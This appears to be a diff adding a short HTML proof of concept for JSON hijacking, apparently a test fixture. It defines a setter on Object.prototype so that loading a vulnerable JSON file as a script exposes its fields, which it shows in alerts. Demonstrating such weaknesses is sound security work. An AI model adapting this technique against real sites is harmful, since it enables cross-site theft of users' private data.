@@ -1,0 +1,14 @@
+<html>
+<head>
+<script type="text/javascript">
+Object.defineProperty(Object.prototype, 'user', { set:function(obj) {
+  for(var i in obj) {
+    alert(i + '=' + obj[i]);
+  }
+}
+});
+</script>
+<script src="../data/vuln-object.json"></script>
+</head>
+<body></body>
+</html>
